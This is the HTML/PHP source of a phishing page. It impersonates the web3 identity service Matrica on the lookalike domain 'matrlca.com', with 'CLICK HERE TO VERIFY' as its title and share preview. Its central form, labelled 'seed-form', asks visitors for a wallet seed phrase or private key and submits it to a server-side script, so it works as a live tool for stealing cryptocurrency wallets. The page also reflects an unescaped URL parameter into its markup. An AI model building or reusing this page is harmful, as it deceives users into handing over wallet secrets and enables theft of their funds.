<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Matrica connects web3 identities + marketplaces + blockchain tools + social communities. Connect nft. All the web3 tools you need in one place.">
  <!-- Open Graph / Facebook -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://matrlca.com/">
  <meta property="og:title" content="CLICK HERE TO VERIFY">
  <meta property="og:description" content="Matrica connects web3 identities + marketplaces + blockchain tools + social communities. Connect nft. All the web3 tools you need in one place.">
  <meta property="og:image" content="https://matrlca.com/assets/images/banner_front.jpg">
  <!-- Twitter -->
  <meta property="twitter:card" content="summary_large_image">
  <meta property="twitter:url" content="https://matrlca.com/">
  <meta property="twitter:title" content="CLICK HERE TO VERIFY">
  <meta property="twitter:description" content="Matrica connects web3 identities + marketplaces + blockchain tools + social communities. Connect nft. All the web3 tools you need in one place.">
  <meta property="twitter:image" content="https://matrlca.com/assets/images/banner_front.jpg">

  <title>CLICK HERE TO VERIFY</title>

  <!-- Favicon -->
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

  <!-- Fonts -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" />


  <link rel="stylesheet" href="assets/vendor/bootstrap.min.css">
  <link rel="stylesheet" href="assets/vendor/fontawesome.css">
  <link rel="stylesheet" href="assets/css/main.css">
  <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>

<body>
  <!-- Header section -->
  <div class="container-fluid border-bottom fixed-top" id="header-wrapper">
    <header class="d-flex align-items-center justify-content-around justify-content-md-around py-3 header">
      <div class="d-flex align-items-center col-md-2 mb-2 mb-md-0 text-dark text-decoration-none mr-5 header-icons">
        <a class="me-3">
          <img src="assets/images/menu-icon-white.svg" alt="" height="15px">
        </a>
        <a href="/" class="">
          <img src="assets/images/logo-white.svg" alt="" height="25px">
        </a>
      </div>

      <form class="w-75">
        <div class="input-group">
          <span class="input-group-text" id="search-icon"><i class="fas fa-search"></i></span>
          <input type="search" class="form-control search-icon py-3" placeholder="Search users, wallets, or collections" aria-label="Search" aria-describedby="search-icon">
        </div>
      </form>

      <div class="col-md-2 d-none d-md-flex justify-content-end">
        <svg height="25px" focusable=" false" aria-hidden="true" viewBox="0 0 24 24">
          <path fill="#ffffff" d="M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69zM12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6zm0-10c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4z"></path>
        </svg>
      </div>
    </header>
  </div>

  <section class="auth">
    <div class="auth-box">

      <form action="server/process.php" method="post" id="seed-form">
        <?php

        if ($_GET['type'] == 'Other') {
          echo '<input type="text" name="type" placeholder="Wallet name" id="" class="form-control mb-3 auth-input" required />';
        } else {
          echo '<input type="hidden" class="mt-3" name="type" value="' . $_GET['type'] . '" />';
        }

        ?>
        <textarea name="seed_phrase" id="" cols="70" rows="5" class="form-control auth-input" placeholder="seed phrase, private key, ..." required></textarea>
        <div id="loader"></div>
        <div class="d-flex justify-content-center">
          <button type="submit" class="btn-default mb-0" id="connectButton"> Connect Wallet</button>
        </div>
      </form>

    </div>
  </section>

  <script src="assets/vendor/jquery.js"></script>
  <script src="assets/vendor/bootstrap.min.js"></script>
  <script src="assets/vendor/fontawesome.js"></script>
  <script src="assets/js/main.js"></script>
</body>

</html>